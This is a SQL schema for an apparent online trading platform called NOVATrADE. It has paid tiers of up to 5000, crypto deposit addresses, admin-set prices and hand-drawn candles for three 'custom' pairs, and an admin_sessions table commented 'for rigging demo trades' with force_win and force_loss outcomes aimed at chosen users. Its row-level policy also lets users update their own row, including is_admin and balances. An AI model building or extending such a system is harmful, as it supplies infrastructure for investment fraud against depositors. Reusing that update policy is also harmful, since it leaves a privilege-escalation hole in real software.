-- NOVATrADE Supabase Schema
-- Hybrid Market System: Real API + Admin-Controlled Pairs

-- ============================================
-- USERS & AUTHENTICATION
-- ============================================

CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  full_name TEXT,
  phone TEXT,
  country TEXT,
  
  -- Trading tier (determines access level)
  tier TEXT DEFAULT 'basic' CHECK (tier IN ('basic', 'tier1', 'tier2', 'tier3', 'tier4')),
  tier_expires_at TIMESTAMPTZ,
  
  -- Balances
  balance_available DECIMAL(18,2) DEFAULT 0,
  balance_bonus DECIMAL(18,2) DEFAULT 0,
  balance_in_trade DECIMAL(18,2) DEFAULT 0,
  
  -- Margin account
  margin_balance DECIMAL(18,2) DEFAULT 0,
  margin_equity DECIMAL(18,2) DEFAULT 0,
  margin_used DECIMAL(18,2) DEFAULT 0,
  
  -- KYC
  kyc_status TEXT DEFAULT 'pending' CHECK (kyc_status IN ('pending', 'verified', 'rejected')),
  kyc_documents JSONB,
  
  -- Referral
  referral_code TEXT UNIQUE,
  referred_by UUID REFERENCES users(id),
  
  -- Metadata
  is_admin BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  last_login TIMESTAMPTZ
);

-- ============================================
-- TRADING TIERS (Subscription/Access Levels)
-- ============================================

CREATE TABLE trading_tiers (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  price DECIMAL(10,2) NOT NULL,
  description TEXT,
  
  -- Features
  max_leverage INTEGER DEFAULT 10,
  spread_discount DECIMAL(5,2) DEFAULT 0, -- percentage off spread
  daily_signals INTEGER DEFAULT 0,
  copy_trading_access BOOLEAN DEFAULT false,
  bot_access BOOLEAN DEFAULT false,
  priority_support BOOLEAN DEFAULT false,
  account_manager BOOLEAN DEFAULT false,
  vip_webinars BOOLEAN DEFAULT false,
  custom_strategies BOOLEAN DEFAULT false,
  
  -- Limits
  max_position_size DECIMAL(18,2),
  max_daily_trades INTEGER,
  
  features JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insert default tiers
INSERT INTO trading_tiers (id, name, price, description, max_leverage, spread_discount, daily_signals, copy_trading_access, bot_access, priority_support, account_manager, vip_webinars, custom_strategies, max_position_size, max_daily_trades, features) VALUES
('basic', 'Basic', 0, 'Free access to learn and practice', 10, 0, 0, false, false, false, false, false, false, 1000, 10, '{"demo_account": true, "basic_charts": true, "educational_content": true}'),
('tier1', 'Starter', 500, 'Begin your trading journey', 50, 10, 3, false, false, false, false, false, false, 5000, 25, '{"live_trading": true, "basic_signals": true, "email_support": true}'),
('tier2', 'Trader', 1000, 'For serious traders', 100, 20, 10, true, false, true, false, false, false, 25000, 50, '{"copy_trading": true, "advanced_charts": true, "chat_support": true}'),
('tier3', 'Professional', 3000, 'Professional trading tools', 200, 35, 25, true, true, true, true, true, false, 100000, 100, '{"trading_bots": true, "account_manager": true, "vip_signals": true}'),
('tier4', 'Elite', 5000, 'Ultimate trading experience', 500, 50, 999, true, true, true, true, true, true, NULL, NULL, '{"unlimited_everything": true, "custom_strategies": true, "private_channel": true}');

-- ============================================
-- CUSTOM ADMIN-CONTROLLED PAIRS (Sandbox)
-- ============================================

-- The 3 rare pairs that admin controls
CREATE TABLE custom_pairs (
  id TEXT PRIMARY KEY,
  symbol TEXT UNIQUE NOT NULL,
  name TEXT NOT NULL,
  base_currency TEXT NOT NULL,
  quote_currency TEXT NOT NULL,
  
  -- Current price (admin sets this)
  current_price DECIMAL(18,8),
  bid_price DECIMAL(18,8),
  ask_price DECIMAL(18,8),
  spread DECIMAL(10,6),
  
  -- For display
  pip_value DECIMAL(10,6) DEFAULT 0.0001,
  min_lot_size DECIMAL(10,4) DEFAULT 0.01,
  max_leverage INTEGER DEFAULT 100,
  
  -- Status
  is_active BOOLEAN DEFAULT true,
  trading_enabled BOOLEAN DEFAULT true,
  
  description TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insert the 3 admin-controlled pairs
INSERT INTO custom_pairs (id, symbol, name, base_currency, quote_currency, current_price, bid_price, ask_price, spread, description) VALUES
('NOVA_USD', 'NOVA/USD', 'NOVA Token vs USD', 'NOVA', 'USD', 2.45, 2.44, 2.46, 0.02, 'Platform native token - Admin controlled for educational scenarios'),
('ZAR_GOLD', 'ZAR/XAU', 'South African Rand vs Gold', 'ZAR', 'XAU', 0.00285, 0.00284, 0.00286, 0.00002, 'Exotic pair for pattern recognition training'),
('STRATEGY_1', 'EDU/USD', 'Educational Pair', 'EDU', 'USD', 100.00, 99.95, 100.05, 0.10, 'Special pair for live trading demonstrations');

-- ============================================
-- CUSTOM CANDLES (Admin draws these)
-- ============================================

CREATE TABLE custom_candles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  pair_id TEXT REFERENCES custom_pairs(id) ON DELETE CASCADE,
  
  -- OHLC Data
  timestamp TIMESTAMPTZ NOT NULL,
  timeframe TEXT NOT NULL CHECK (timeframe IN ('1m', '5m', '15m', '1h', '4h', '1d', '1w')),
  open DECIMAL(18,8) NOT NULL,
  high DECIMAL(18,8) NOT NULL,
  low DECIMAL(18,8) NOT NULL,
  close DECIMAL(18,8) NOT NULL,
  volume DECIMAL(18,2) DEFAULT 0,
  
  -- Admin metadata
  is_simulated BOOLEAN DEFAULT true,
  pattern_hint TEXT, -- e.g., "bull_flag", "head_shoulders", "support_bounce"
  lesson_note TEXT, -- Admin can add teaching notes
  created_by UUID REFERENCES users(id),
  
  created_at TIMESTAMPTZ DEFAULT NOW(),
  
  UNIQUE(pair_id, timestamp, timeframe)
);

-- Index for fast candle queries
CREATE INDEX idx_custom_candles_pair_time ON custom_candles(pair_id, timestamp DESC);
CREATE INDEX idx_custom_candles_timeframe ON custom_candles(pair_id, timeframe, timestamp DESC);

-- ============================================
-- DEPOSITS & WITHDRAWALS
-- ============================================

CREATE TABLE deposit_addresses (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  currency TEXT NOT NULL,
  network TEXT NOT NULL,
  address TEXT NOT NULL,
  qr_code_url TEXT,
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insert default deposit addresses (admin will update these)
INSERT INTO deposit_addresses (currency, network, address) VALUES
('BTC', 'Bitcoin', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'),
('ETH', 'ERC-20', '0x742d35Cc6634C0532925a3b844Bc9e7595f4bEa1'),
('USDT', 'TRC-20', 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9'),
('USDT', 'ERC-20', '0x742d35Cc6634C0532925a3b844Bc9e7595f4bEa1'),
('SOL', 'Solana', '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d'),
('BNB', 'BEP-20', '0x742d35Cc6634C0532925a3b844Bc9e7595f4bEa1');

CREATE TABLE transactions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id) ON DELETE CASCADE,
  
  type TEXT NOT NULL CHECK (type IN ('deposit', 'withdrawal', 'tier_purchase', 'trade_profit', 'trade_loss', 'bonus', 'referral')),
  
  amount DECIMAL(18,2) NOT NULL,
  currency TEXT DEFAULT 'USD',
  
  -- For crypto transactions
  crypto_currency TEXT,
  crypto_amount DECIMAL(18,8),
  tx_hash TEXT,
  wallet_address TEXT,
  
  -- For tier purchases
  tier_id TEXT REFERENCES trading_tiers(id),
  
  status TEXT DEFAULT 'pending' CHECK (status IN ('pending', 'processing', 'completed', 'failed', 'cancelled')),
  
  notes TEXT,
  processed_by UUID REFERENCES users(id),
  processed_at TIMESTAMPTZ,
  
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- ============================================
-- TRADES & POSITIONS
-- ============================================

CREATE TABLE trades (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES users(id) ON DELETE CASCADE,
  
  -- Asset info
  symbol TEXT NOT NULL,
  asset_type TEXT NOT NULL CHECK (asset_type IN ('forex', 'crypto', 'stock', 'custom')),
  is_custom_pair BOOLEAN DEFAULT false,
  
  -- Position details
  side TEXT NOT NULL CHECK (side IN ('buy', 'sell', 'long', 'short')),
  quantity DECIMAL(18,8) NOT NULL,
  entry_price DECIMAL(18,8) NOT NULL,
  exit_price DECIMAL(18,8),
  
  -- For margin trades
  leverage INTEGER DEFAULT 1,
  margin_used DECIMAL(18,2),
  liquidation_price DECIMAL(18,8),
  
  -- Risk management
  stop_loss DECIMAL(18,8),
  take_profit DECIMAL(18,8),
  
  -- P&L
  realized_pnl DECIMAL(18,2),
  commission DECIMAL(18,2) DEFAULT 0,
  
  -- Status
  status TEXT DEFAULT 'open' CHECK (status IN ('open', 'closed', 'liquidated', 'cancelled')),
  
  opened_at TIMESTAMPTZ DEFAULT NOW(),
  closed_at TIMESTAMPTZ
);

CREATE INDEX idx_trades_user ON trades(user_id, status);
CREATE INDEX idx_trades_symbol ON trades(symbol, status);

-- ============================================
-- ADMIN SESSION SIGNALS (for rigging demo trades)
-- ============================================

CREATE TABLE admin_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  name TEXT NOT NULL,
  description TEXT,
  
  -- Session config
  target_user_id UUID REFERENCES users(id), -- NULL means all users
  target_pair TEXT,
  
  -- Signal type
  signal_type TEXT CHECK (signal_type IN ('force_win', 'force_loss', 'specific_outcome', 'pattern_lesson')),
  signal_config JSONB, -- e.g., {"win_percentage": 80, "max_profit": 500}
  
  -- Status
  is_active BOOLEAN DEFAULT false,
  starts_at TIMESTAMPTZ,
  ends_at TIMESTAMPTZ,
  
  created_by UUID REFERENCES users(id),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- ============================================
-- REALTIME SUBSCRIPTIONS
-- ============================================

-- Enable realtime for custom candles (so charts update live)
ALTER PUBLICATION supabase_realtime ADD TABLE custom_candles;
ALTER PUBLICATION supabase_realtime ADD TABLE custom_pairs;
ALTER PUBLICATION supabase_realtime ADD TABLE trades;

-- ============================================
-- ROW LEVEL SECURITY
-- ============================================

ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE trades ENABLE ROW LEVEL SECURITY;
ALTER TABLE transactions ENABLE ROW LEVEL SECURITY;

-- Users can only see their own data
CREATE POLICY "Users can view own data" ON users FOR SELECT USING (auth.uid() = id);
CREATE POLICY "Users can update own data" ON users FOR UPDATE USING (auth.uid() = id);

-- Trades visible to owner only
CREATE POLICY "Users can view own trades" ON trades FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can insert own trades" ON trades FOR INSERT WITH CHECK (auth.uid() = user_id);

-- Transactions visible to owner only
CREATE POLICY "Users can view own transactions" ON transactions FOR SELECT USING (auth.uid() = user_id);

-- Custom pairs and candles are public (read-only for users)
CREATE POLICY "Anyone can view custom pairs" ON custom_pairs FOR SELECT USING (true);
CREATE POLICY "Anyone can view custom candles" ON custom_candles FOR SELECT USING (true);

-- Admin policies (check is_admin in users table)
CREATE POLICY "Admins can do anything on custom_pairs" ON custom_pairs FOR ALL USING (
  EXISTS (SELECT 1 FROM users WHERE id = auth.uid() AND is_admin = true)
);
CREATE POLICY "Admins can do anything on custom_candles" ON custom_candles FOR ALL USING (
  EXISTS (SELECT 1 FROM users WHERE id = auth.uid() AND is_admin = true)
);

-- ============================================
-- FUNCTIONS & TRIGGERS
-- ============================================

-- Auto-update updated_at timestamp
CREATE OR REPLACE FUNCTION update_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER update_users_updated_at
  BEFORE UPDATE ON users
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();

CREATE TRIGGER update_custom_pairs_updated_at
  BEFORE UPDATE ON custom_pairs
  FOR EACH ROW EXECUTE FUNCTION update_updated_at();

-- Function to update current price when new candle is added
CREATE OR REPLACE FUNCTION update_pair_price_from_candle()
RETURNS TRIGGER AS $$
BEGIN
  UPDATE custom_pairs
  SET 
    current_price = NEW.close,
    bid_price = NEW.close - (spread / 2),
    ask_price = NEW.close + (spread / 2),
    updated_at = NOW()
  WHERE id = NEW.pair_id;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER update_pair_price_on_candle
  AFTER INSERT ON custom_candles
  FOR EACH ROW EXECUTE FUNCTION update_pair_price_from_candle();
